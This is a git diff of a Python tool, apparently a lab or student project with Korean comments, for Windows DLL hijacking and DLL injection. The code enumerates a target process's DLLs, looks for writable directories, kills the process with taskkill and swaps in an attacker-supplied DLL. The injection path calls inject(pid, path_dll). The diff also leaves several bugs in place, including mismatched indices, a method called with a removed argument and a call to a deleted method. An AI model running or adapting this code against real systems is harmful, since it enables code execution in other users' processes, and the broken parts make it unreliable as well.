@@ -7,7 +7,7 @@ import shutil
 class hiJacking():
     def hiJacking(self):
         pass
-    def in_PID(self):
+    def __init__(self):
         del_pidlist = [0, 4, 120, 540, 748, 848, 860, 908, 916, 948,
                        988, 1196, 1256, 1420, 1424, 1436, 1456, 1468, 1548, 1628,
                        1740, 1748, 1812, 1820, 1828, 1924, 2000, 2072, 2096, 2172,
@@ -18,30 +18,33 @@ class hiJacking():
                        8344, 8484, 8620, 8724, 8744, 8852, 9272, 9312, 9612, 9820,
                        10228, 10236, 10408, 11228, 11540, 11852, 13152, 13712, 14300, 15280,
                        16536, 17396]
-        pid = input('pid 1개 입력 시 맨 앞에 \'o\', 2개 이상 입력 시 \'m\' 명령어를 입력해주세요.\n예시> 1개 -> o pid\n     2개 이상 -> m pid pid ...\n입력할 명령어:')
-        pid_arr = pid.split(' ')
-        if pid[0] == 'o':
-            pid = pid_arr[1]
-        elif pid[0] == 'm':
-            pid = []
+        pid_in = input('pid 1개 입력 시 맨 앞에 \'o\', 2개 이상 입력 시 \'m\' 명령어를 입력해주세요.\n예시> 1개 -> o pid\n      2개 이상 -> m pid pid ...\n입력할 명령어:')
+        pid_arr = pid_in.split(' ')
+        self.pid = []
+        if pid_arr[0] == 'o':
+            self.pid.append(pid_arr[1])
+        elif pid_arr[0] == 'm':
             for i in range(1, len(pid_arr)):
-                pid.append(pid_arr[i])
+                self.pid.append(pid_arr[i])
                 
-                if int(pid[i]) in del_pidlist:
-                    print(f'You cannot attack PID \'{pid[i]}\'.')
-                    del pid[i]
+                if int(self.pid[i-1]) in del_pidlist:
+                    print(f'You cannot attack PID \'{self.pid[i]}\'.')
+                    del self.pid[i]
         else: 
-            print('Wrong command.')
+            print('\nERROR::Wrong command..')
+            ans = input('Do you want to try again? yes = \'y\', No =\'q\'\ninput: ')
+            if ans == 'y':
+                self.__init__()
+            else: 
+                print("\n\n--End the program--\n")
+                return 
                     
         
-        print("Attackable PID:")
-        print(* pid)
-        
-                
-        return pid
+        print("\nAttackable PID:", * self.pid)
+    
     #Listdlls.exe 파일을 이용하여 입력된 pid에서 로드하는 dll 목록을 가져옴
-    def list_dll(self,pid):
-        stream = os.popen("Listdlls.exe " + str(pid))
+    def list_dll(self):
+        stream = os.popen("Listdlls.exe " + str(self.pid))
         dlls = stream.read()
         program_name = ""
         try:
@@ -50,7 +53,14 @@ class hiJacking():
             if not program_name.endswith('.exe'):
                 raise Exception("not exe File")
         except:
-            print("Wrong pid...")
+            print("\nERROR::Wrong pid...")
+            ans = input('Do you want to try again? yes = \'y\', No =\'q\'\ninput: ')
+            if ans == 'y':
+                self.list_dll()
+            else: 
+                print("\n\n--End the program--\n")
+                return 
+            
         
         
         if 'C:/' not in program_name:
@@ -116,28 +126,33 @@ class hiJacking():
                 shutil.copy2(dll_path,i)
                 
         except:
-            print("Cannot remove or write DLL")
+            print("\nERROR::Cannot remove or write DLL")
     # 사전 검사를 통해 dll Hijacking에 취약한지 확인하여 공격을 함
     # 다만 이것이 일관성(모든 경우에 해당하는) 탐지 및 공격 방법인지는 검증 필요
     def attack(self):
         path_exe = "C:/Users/codeb/Desktop/ExamDLL/CreateDLL/x64/Debug/MainDLL.exe"
         path_dll = "C:/Users/codeb/Desktop/CreateDLL.dll"
         # pid = self.create_process(path_exe)
-        pid = self.in_PID()
-        for i in range(0,len(pid)):
-            print(f'{len(pid)}개의 pid 중 {i}번째 pid로의 hiJacking!')
-            program_name, list_dlls = self.list_dll(int(pid))
+        for i in range(0,len(self.pid)):
+            print(f'{len(self.pid)}개의 pid 중 {i}번째 pid로의 hiJacking!')
+            program_name, list_dlls = self.list_dll(int(self.pid[i]))
             file_list,dir_list = self.check_permission(list_dlls)
             if not len(file_list) == 0:
                 if self.find_string(program_name,file_list,dir_list):
                     print("Detect programs vulnerable to dll injection")
-                    print("Vulnerable PID : " + pid)
-                    os.system('taskkill /f /pid '+pid)
-                    self.change_dll(path_dll,dir_list,int(pid))
+                    print("Vulnerable PID : " + self.pid[i])
+                    os.system('taskkill /f /pid '+self.pid[i])
+                    self.change_dll(path_dll,dir_list,int(self.pid[i]))
                 else:
                     print("Nah....")
             else:
-                print("Not Found writable dir")
+                print("\nERROR::Not Found writable dir")
+                ans = input('Do you want to try again? yes = \'y\', No =\'q\'\ninput: ')
+                if ans == 'y':
+                    self.in_PID()
+                else: 
+                    print("End the program")
+                    return 
 class injection():
     def injection(self):
         pass
@@ -177,21 +192,43 @@ class injection():
     def attack(self,pid,path_dll):
         inject(pid,path_dll)
 
-
+def cho_mod():
+    att_mod = input('DLLInjection: \'DI\', DLLHiJacking: \'DH\'\nChoose attack mode: ')
+    
+    if (att_mod != 'DI') & (att_mod != 'DH'):
+        print("\nERROR::Attack mode is wrong ..")
+        ans = input('Do you want to try again? yes = \'y\', No =\'q\'\ninput: ')
+        if ans == 'y':
+             cho_mod()
+        else: 
+            print("\n\n--End the program--\n")
+            return 'q'
+    
+    return att_mod
+            
 if __name__=='__main__': 
-    att_mod = input(print('\nDLLInjection: \'DI\', DLLHiJacking: \'DH\'\n Choose attack mode:'))
-    if att_mod == 'DI':
+    mode = cho_mod()
+    
+    if mode == 'DI':
         dll_inject = injection()
-    elif att_mod == 'DH':
-        dll_hijact = hiJacking()
+    elif mode == 'DH':
+        dll_hijact_pid = hiJacking()
     else:
-        print("Attack mode is wrong ..")
+        exit()
+        
+        
+    
+        
+        
+        
+        
+    # Injection
+    # pid = dll_inject.in_PID()
+    
+    # HiJacking
     
     path_exe = "C:/Users/codeb/Desktop/ExamDLL/CreateDLL/x64/Debug/MainDLL.exe"
     path_dll = "C:/Users/codeb/Desktop/CreateDLL.dll"
     #pid = dll_hijact.create_process(path_exe)
     #inject(pid,path_dll)
-    dll_hijact.attack()
-    
-    
-        
+    #dll_hijact.attack()
